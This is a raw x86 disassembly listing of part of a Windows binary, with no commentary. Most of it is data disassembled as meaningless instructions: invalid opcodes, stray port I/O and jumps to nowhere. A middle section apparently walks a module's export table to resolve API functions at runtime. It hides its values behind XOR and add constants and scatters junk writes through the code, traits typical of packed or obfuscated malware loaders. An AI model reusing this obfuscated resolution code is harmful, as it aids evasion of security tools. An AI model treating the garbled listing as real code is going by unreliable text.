  406418:	sahf   
  406419:	pop    es
  40641a:	bound  eax,QWORD PTR [edx]
  40641c:	je     0x406470
  40641e:	sbb    dh,BYTE PTR [edx-0x64]
  406421:	jg     0x40642b
  406423:	add    edx,DWORD PTR [edi-0x640c6cb]
  406429:	dec    edx
  40642a:	dec    ebx
  40642b:	cmp    ebp,eax
  40642d:	adc    al,0xd9
  40642f:	in     al,0xac
  406431:	shl    DWORD PTR [ebp+ebp*8+0x12d721f3],cl
  406438:	shl    BYTE PTR [eax-0x502b1b13],1
  40643e:	cmp    BYTE PTR ds:0x5c281b30,bh
  406444:	mov    esp,0x316331d8
  406449:	in     al,dx
  40644a:	jle    0x40646e
  40644c:	mov    ds:0x848be29b,eax
  406451:	int    0x91
  406453:	in     eax,dx
  406454:	outs   dx,DWORD PTR ds:[esi]
  406455:	cmp    eax,0xe4ecb375
  40645a:	outs   dx,BYTE PTR ds:[esi]
  40645b:	jno    0x406484
  40645d:	push   ebx
  40645e:	sbb    al,BYTE PTR [ebp+0x5ea51c43]
  406464:	aaa    
  406465:	and    DWORD PTR [ecx+0x22],esi
  406468:	into   
  406469:	mov    dl,0x95
  40646b:	mov    gs,WORD PTR fs:[edi]
  40646e:	dec    ecx
  40646f:	jnp    0x406488
  406471:	xchg   ecx,eax
  406472:	xor    ebp,ebp
  406474:	jnp    0x4064bf
  406476:	push   ecx
  406477:	fstp   TBYTE PTR [ebx+ecx*8]
  40647a:	aaa    
  40647b:	(bad)  
  40647c:	std    
  40647d:	sbb    esi,DWORD PTR [edi-0x54]
  406480:	adc    DWORD PTR gs:[eax-0x61c11c37],esp
  406487:	jmp    0x40644e
  406489:	push   eax
  40648a:	mov    edx,0xc2f33a83
  40648f:	mov    ds:0x1d8f655f,eax
  406494:	or     edx,esi
  406496:	ss (bad) 
  406498:	or     eax,0x963fee08
  40649d:	inc    ebx
  40649e:	mov    ch,0x57
  4064a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a1:	nop
  4064a2:	adc    esi,DWORD PTR [ebx]
  4064a4:	xchg   edi,eax
  4064a5:	mov    esi,0x5db4c98f
  4064aa:	mov    cl,0xc2
  4064ac:	test   al,0xa5
  4064ae:	or     ah,dl
  4064b0:	retf   0x1afa
  4064b3:	add    eax,0xfe5e716e
  4064b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064b9:	push   es
  4064ba:	sti    
  4064bb:	ja     0x40647c
  4064bd:	stc    
  4064be:	lahf   
  4064bf:	inc    ebx
  4064c0:	pop    ds
  4064c1:	(bad)  
  4064c2:	icebp  
  4064c3:	jnp    0x40653f
  4064c5:	pop    esi
  4064c6:	stc    
  4064c7:	leave  
  4064c8:	rol    BYTE PTR [eax+esi*4-0x4],1
  4064cc:	(bad)  
  4064ce:	mov    edx,0xd7ec80e6
  4064d3:	xchg   esi,eax
  4064d4:	or     dh,BYTE PTR [ebp+0x32]
  4064d7:	and    ebx,esi
  4064d9:	(bad)  
  4064da:	enter  0xe9d5,0x61
  4064de:	dec    ecx
  4064df:	xchg   bl,dl
  4064e1:	cld    
  4064e2:	pop    es
  4064e3:	bound  ebp,QWORD PTR [eax]
  4064e5:	sbb    ah,cl
  4064e7:	mov    edx,?
  4064e9:	fwait
  4064ea:	pop    ecx
  4064eb:	jp     0x406541
  4064ed:	ret    0xd5cb
  4064f0:	mov    ds:0x19a3b098,eax
  4064f5:	loopne 0x4064cd
  4064f7:	adc    al,0x51
  4064f9:	pop    ebp
  4064fa:	outs   dx,BYTE PTR ds:[esi]
  4064fb:	clc    
  4064fc:	repnz mov bl,0xa
  4064ff:	and    dh,bh
  406501:	fistp  QWORD PTR [eax+0x7b6b6314]
  406507:	mov    ch,0xfa
  406509:	(bad)  
  40650a:	nop
  40650b:	and    BYTE PTR [eax-0x6c],dl
  40650e:	lea    eax,[esi]
  406510:	(bad)  
  406511:	out    dx,al
  406512:	out    dx,al
  406513:	mov    al,gs:0x7dbf0159
  406519:	lock mov ebp,DWORD PTR [ecx]
  40651c:	xchg   cl,dl
  40651e:	das    
  40651f:	cmc    
  406520:	push   cs
  406521:	lahf   
  406522:	xchg   ecx,esp
  406524:	cld    
  406525:	sbb    bl,BYTE PTR [ebp-0x13f5daee]
  40652b:	xor    edi,DWORD PTR [ecx]
  40652d:	mov    DWORD PTR [edx+0x3a9d4e84],esp
  406533:	out    0x7e,al
  406535:	cmp    al,0x54
  406537:	jns    0x406559
  406539:	mov    ebp,0x5e708414
  40653e:	cmp    dh,bl
  406540:	cmp    al,0x2b
  406542:	or     dh,BYTE PTR [edx+ecx*8-0x4dbf94b7]
  406549:	repz pop ebx
  40654b:	lahf   
  40654c:	and    esp,DWORD PTR [esi-0x79478e1c]
  406552:	imul   edx,DWORD PTR [edx],0xfb110fb3
  406558:	lods   eax,DWORD PTR ds:[esi]
  406559:	cld    
  40655a:	mov    ecx,0x9143bf8f
  40655f:	mov    ds:0x6c520d11,al
  406564:	or     BYTE PTR [edx],ah
  406566:	int    0x4c
  406568:	mov    ebp,?
  40656a:	and    BYTE PTR [eax],ah
  40656c:	cmp    DWORD PTR [ecx-0x38f175d],eax
  406572:	mov    edx,0xa7787702
  406577:	dec    eax
  406578:	inc    esi
  406579:	das    
  40657a:	outs   dx,BYTE PTR ds:[esi]
  40657b:	mov    ds:0x19213ed6,eax
  406580:	nop
  406581:	cmp    eax,edi
  406583:	js     0x40653c
  406585:	fcomp  QWORD PTR [edi]
  406587:	mov    ch,0xfd
  406589:	mov    eax,ds:0x2c799669
  40658e:	dec    edx
  40658f:	lock pop esp
  406591:	data16 arpl WORD PTR [esi+ebp*1-0x4cb276cc],dx
  406599:	push   edx
  40659a:	push   ds
  40659b:	push   0xc88fe521
  4065a0:	fld    QWORD PTR [eax]
  4065a2:	nop
  4065a3:	cwde   
  4065a4:	xchg   esp,eax
  4065a5:	adc    bl,BYTE PTR [edx-0x7eb49f92]
  4065ab:	jl     0x4065a5
  4065ad:	icebp  
  4065ae:	stos   DWORD PTR es:[edi],eax
  4065af:	addr16 cmp al,0xce
  4065b2:	or     ecx,DWORD PTR [edi+0x3c]
  4065b5:	add    eax,0x37fd6ce9
  4065ba:	cld    
  4065bb:	fist   WORD PTR [edx-0xe]
  4065be:	mov    dl,0xa2
  4065c0:	jae    0x40658b
  4065c2:	adc    BYTE PTR [ebx-0x46],dh
  4065c5:	into   
  4065c6:	xchg   ebx,eax
  4065c7:	xchg   ebx,eax
  4065c8:	hlt    
  4065c9:	mov    bl,0x9f
  4065cb:	ss sub eax,0xed4d554c
  4065d1:	mov    BYTE PTR [edi],dl
  4065d3:	jnp    0x4065e4
  4065d5:	add    DWORD PTR [ecx],esp
  4065d7:	sub    cl,BYTE PTR [ebx]
  4065d9:	sbb    DWORD PTR [ebx+ebp*2+0x216352d1],edx
  4065e0:	adc    eax,0x25626fc6
  4065e5:	repnz cs lahf 
  4065e8:	mov    ds:0x8d25968d,eax
  4065ed:	int    0xff
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d20c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42003f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1d4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x35],0xa6
  4069c2:	arpl   WORD PTR [edi],cx
  4069c4:	ret    0x623c
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x60]
  4069cd:	lods   eax,DWORD PTR ds:[esi]
  4069ce:	ins    BYTE PTR es:[edi],dx
  4069cf:	xor    BYTE PTR fs:[eax],cl
  4069d2:	sub    eax,0x46916ee1
  4069d7:	sbb    eax,0xe085f8c0
  4069dc:	(bad)  
  4069dd:	fldcw  WORD PTR [esi]
  4069df:	stos   BYTE PTR es:[edi],al
  4069e0:	test   BYTE PTR [esi+0x52],0xb3
  4069e4:	in     al,dx
  4069e5:	inc    ecx
  4069e6:	cwde   
  4069e7:	loope  0x406a4d
  4069e9:	sbb    edi,ecx
  4069eb:	xchg   edi,eax
  4069ec:	push   es
  4069ed:	sahf   
  4069ee:	icebp  
  4069ef:	jle    0x4069ee
  4069f1:	sub    ebp,DWORD PTR [ebx+edi*8-0xcaa05b9]
  4069f8:	pop    eax
  4069f9:	jle    0x406990
  4069fb:	pop    edi
  4069fc:	push   edi
  4069fd:	adc    al,0xd8
  4069ff:	out    0x77,eax
  406a01:	mov    dh,0x4
  406a03:	sub    al,0xd5
  406a05:	in     al,dx
  406a06:	or     al,0x81
  406a08:	sub    ebp,DWORD PTR [esp+eax*4]
  406a0b:	shl    BYTE PTR [ecx-0xa],0x5b
  406a0f:	xchg   esi,eax
  406a10:	loope  0x4069e0
  406a12:	push   edx
  406a13:	jg     0x4069ee
  406a15:	pop    DWORD PTR [ebx-0x54a553f4]
  406a1b:	adc    bl,ah
  406a1d:	inc    ebx
  406a1e:	mov    DWORD PTR [ebp+0x68],eax
  406a21:	outs   dx,DWORD PTR ds:[esi]
  406a22:	xor    eax,0xbbf1381b
  406a27:	mov    ebp,0x9038051e
  406a2c:	lods   al,BYTE PTR ds:[esi]
  406a2d:	jnp    0x4069d2
  406a2f:	push   esi
  406a30:	dec    ebx
  406a31:	cmp    BYTE PTR [eax],al
  406a33:	repz out 0x3a,al
  406a36:	das    
  406a37:	pop    ebp
  406a38:	cmp    ecx,DWORD PTR [ebx-0x1a]
  406a3b:	lea    esp,[eax]
  406a3d:	inc    esi
  406a3e:	push   0x3a7dac75
  406a43:	fst    DWORD PTR [edx]
  406a45:	jno    0x406a3e
  406a47:	out    dx,eax
  406a48:	sbb    edi,DWORD PTR [eax-0x31]
  406a4b:	mov    esp,0x1fc31a47
  406a50:	add    BYTE PTR [eax],dl
  406a52:	mov    ebp,DWORD PTR [edx+0x69]
  406a55:	ror    DWORD PTR [ecx-0x7219ae4],cl
  406a5b:	ret    0xde82
  406a5e:	dec    edx
  406a5f:	add    eax,0x7e686364
  406a64:	ds data16 ins BYTE PTR es:[edi],dx
  406a67:	test   eax,0xcb40afdf
  406a6c:	nop
  406a6d:	mov    al,ds:0xbac15a75
  406a72:	popa   
  406a73:	or     eax,0x45bccd96
  406a78:	mov    ds:0x68104a39,al
  406a7d:	mov    edx,edx
  406a7f:	jle    0x406abb
  406a81:	mov    al,bl
  406a83:	add    ah,cl
  406a85:	shl    BYTE PTR [ebx],1
  406a87:	out    dx,al
  406a88:	retf   
  406a89:	push   cs
  406a8a:	shr    al,1
  406a8c:	sub    ebp,ebx
  406a8e:	popa   
  406a8f:	in     al,0xdc
  406a91:	and    esi,DWORD PTR [eax+ecx*8]
  406a94:	test   eax,0xfcc95780
  406a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a9a:	loop   0x406acb
  406a9c:	cdq    
  406a9d:	dec    edi
  406a9e:	test   eax,0x9906ab47
  406aa3:	jmp    0x46ff1b4c
  406aa8:	inc    ecx
  406aa9:	rcl    DWORD PTR [esi],1
  406aab:	push   0xffffffcd
  406aad:	enter  0xb324,0x15
  406ab1:	(bad)  
  406ab2:	stos   BYTE PTR es:[edi],al
  406ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab4:	int3   
  406ab5:	addr16 sbb esi,edx
  406ab8:	fwait
  406ab9:	mov    al,ds:0x97529a5
  406abe:	ja     0x406a98
  406ac0:	clc    
  406ac1:	jp     0x406afa
  406ac3:	test   DWORD PTR [edx+0x41f84ec0],esi
  406ac9:	cld    
  406aca:	mov    eax,0xce222f39
  406acf:	test   esi,0x3ba6d855
  406ad5:	cmp    eax,0x304bbb
  406ada:	fadd   DWORD PTR [ecx-0x1c]
  406add:	xor    esp,ebp
  406adf:	rol    dl,1
  406ae1:	(bad)  
  406ae2:	loopne 0x406b02
  406ae4:	inc    edi
  406ae5:	xor    al,0x57
  406ae7:	ins    BYTE PTR es:[edi],dx
  406ae8:	adc    dl,BYTE PTR [ebp-0x45]
  406aeb:	imul   esp,DWORD PTR [edi],0xffffff91
  406aee:	popa   
  406aef:	fbld   TBYTE PTR [edi+0x147f606]
  406af5:	jmp    0x406afb
  406af7:	jbe    0x406b49
  406af9:	in     eax,0x92
  406afb:	sub    BYTE PTR [ebx+0x2a],0xb6
  406aff:	sub    eax,0x4170ffba
  406b04:	int3   
  406b05:	add    ebp,DWORD PTR [edi+0x24333cbb]
  406b0b:	in     al,dx
  406b0c:	daa    
  406b0d:	dec    ecx
  406b0e:	mov    al,ds:0x7b0641a
  406b13:	es pop ebp
  406b15:	test   BYTE PTR [esp+ecx*2],dh
  406b18:	adc    edx,DWORD PTR [esi]
  406b1a:	sahf   
  406b1b:	out    dx,eax
  406b1c:	push   cs
  406b1d:	jmp    0x406ab1
  406b1f:	shl    BYTE PTR [edi+0x46],1
  406b22:	cwde   
  406b23:	cmp    eax,0x37039b33
  406b28:	lea    esp,[ecx]
  406b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2b:	xchg   edx,eax
  406b2c:	xchg   ebx,eax
  406b2d:	ja     0x406ae7
  406b2f:	jge    0x406aef
  406b31:	(bad)  
  406b32:	sti    
  406b33:	outs   dx,DWORD PTR ds:[esi]
  406b34:	repnz mov ds:0x536677f5,al
  406b3a:	fisttp DWORD PTR [ebx]
  406b3c:	or     edx,DWORD PTR cs:[esi]
  406b3f:	xor    BYTE PTR [edx+0x7c],al
  406b42:	sbb    eax,0xa3e426c7
  406b47:	mov    ebp,0xd4ff2764
  406b4c:	imul   eax,DWORD PTR [eax+0x62],0x9
  406b50:	push   ecx
  406b51:	jmp    0x406b10
  406b53:	int3   
  406b54:	push   esp
  406b55:	cmp    edi,0xd0bd7644
  406b5b:	call   FWORD PTR [edx]
  406b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b5e:	call   0x2a8d1883
  406b63:	dec    ebx
  406b64:	stos   DWORD PTR es:[edi],eax
  406b65:	lods   eax,DWORD PTR ds:[esi]
  406b66:	ss jge 0x406b4b
  406b69:	leave  
  406b6a:	mov    ebx,0x277decfd
  406b6f:	or     BYTE PTR [esi-0x3c],0xaf
  406b73:	add    BYTE PTR [eax+0x39],dh
  406b76:	std    
  406b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b78:	mov    ds:0xc59d6449,al
  406b7d:	int3   
  406b7e:	inc    ebp
  406b7f:	push   eax
  406b80:	scas   eax,DWORD PTR es:[edi]
  406b81:	call   0xef1b3f4f
  406b86:	xor    al,0x9b
  406b88:	test   al,0xcb
  406b8a:	and    al,0xc3
  406b8c:	mov    cl,0xaf
  406b8e:	(bad)  
  406b8f:	jp     0x406b96
  406b91:	(bad)  
  406b92:	cmp    ebx,DWORD PTR [edi+0x12]
  406b95:	push   ds
  406b96:	stc    
  406b97:	and    BYTE PTR [edx],al
  406b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9a:	and    DWORD PTR [esi],ecx
  406b9c:	jmp    0xc105:0x1a27fdcd
  406ba3:	jb     0x406b2f
  406ba5:	shl    bh,1
  406ba7:	pop    esp
  406ba8:	dec    esp
  406ba9:	cli    
  406baa:	or     esp,edi
  406bac:	push   cs
  406bad:	sub    eax,0xe0c35e4e
  406bb2:	cld    
  406bb3:	dec    BYTE PTR [ecx-0x6dd1d0f]
  406bb9:	mov    ds:0x1e5e9523,eax
  406bbe:	sbb    eax,0x83ae7cfd
  406bc3:	into   
  406bc4:	push   edi
  406bc5:	push   esp
  406bc6:	dec    ecx
  406bc7:	adc    esi,ebx
  406bc9:	call   DWORD PTR [ebx+esi*1-0x20]
  406bcd:	cmp    BYTE PTR ds:0x28a478b6,ah
  406bd3:	dec    esp
  406bd4:	push   ds
  406bd5:	cli    
  406bd6:	inc    edi
  406bd7:	test   bl,bh
  406bd9:	mov    ch,0xb8
  406bdb:	out    0xec,al
  406bdd:	mov    DWORD PTR [ebx],0x7c3103c6
  406be3:	jge    0x406baa
  406be5:	push   ds
  406be6:	aas    
  406be7:	dec    DWORD PTR [ebp+eax*1-0x885e0c5]
  406bee:	push   esi
  406bef:	xchg   ecx,eax
  406bf0:	fisubr DWORD PTR [ecx-0xb6399bf]
  406bf6:	pop    esi
  406bf7:	in     eax,dx
  406bf8:	repz jp 0x406c68
  406bfb:	sbb    al,0x3c
  406bfd:	jne    0x406c0d
  406bff:	inc    edx
  406c00:	lods   al,BYTE PTR ds:[esi]
  406c01:	jge    0x406c1f
  406c03:	xchg   esp,eax
  406c04:	cdq    
  406c05:	pop    ebp
  406c06:	in     al,dx
  406c07:	adc    al,BYTE PTR [esi]
  406c09:	iret   
  406c0a:	add    BYTE PTR [ebx],ch
  406c0c:	or     BYTE PTR [edx+0x21],al
  406c0f:	pop    ecx
  406c10:	xchg   ecx,eax
  406c11:	mov    ch,0xc3
  406c13:	dec    edi
  406c14:	je     0x406b9f
  406c16:	mov    ecx,DWORD PTR [eax*1-0x77c38108]
  406c1d:	in     eax,dx
  406c1e:	test   eax,0x7d78fbb0
  406c23:	sahf   
  406c24:	scas   eax,DWORD PTR es:[edi]
  406c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c26:	mov    edx,0x39111999
  406c2b:	loop   0x406c62
  406c2d:	or     al,0xbe
  406c2f:	ins    BYTE PTR es:[edi],dx
  406c30:	je     0x406bc2
  406c32:	outs   dx,DWORD PTR ds:[esi]
  406c33:	mov    ecx,0x92698110
  406c38:	stos   BYTE PTR es:[edi],al
  406c39:	ins    BYTE PTR es:[edi],dx
  406c3a:	sub    al,0x91
  406c3c:	ret    0x6764
  406c3f:	outs   dx,DWORD PTR ss:[esi]
  406c41:	inc    ecx
  406c42:	fldcw  WORD PTR ds:0xa8156b1f
  406c48:	les    eax,FWORD PTR [edi+0x25]
  406c4b:	dec    ecx
  406c4c:	cs add al,0x93
  406c4f:	push   ss
  406c50:	shr    BYTE PTR [edx+eax*1+0x543d73fd],0x3f
  406c58:	sar    DWORD PTR [ebx],0xc6
  406c5b:	lods   eax,DWORD PTR ds:[esi]
  406c5c:	ret    0x16c0
  406c5f:	mov    ds:0x4d0c820b,eax
  406c64:	mov    ds:0xeebb6dce,al
  406c69:	aas    
  406c6a:	xor    BYTE PTR fs:[ecx],0x74
  406c6e:	adc    al,0x85
  406c70:	jno    0x406c5c
  406c72:	mov    dh,0x9e
  406c74:	out    0x95,al
  406c76:	fdivrp st(7),st
  406c78:	call   0xe24d4a29
  406c7d:	pusha  
  406c7e:	cmp    BYTE PTR [ebp-0x639d4dca],0x51
  406c85:	adc    al,0xef
  406c87:	and    bl,BYTE PTR [ebp+0x32cdf19a]
  406c8d:	(bad)  
  406c8e:	adc    DWORD PTR [esi-0x77],ecx
  406c91:	ret    0x80be
  406c94:	sahf   
  406c95:	dec    edi
  406c96:	sub    DWORD PTR [ecx+0x7c742401],0x25
  406c9d:	retf   0xd75f
  406ca0:	jecxz  0x406d21
  406ca2:	cli    
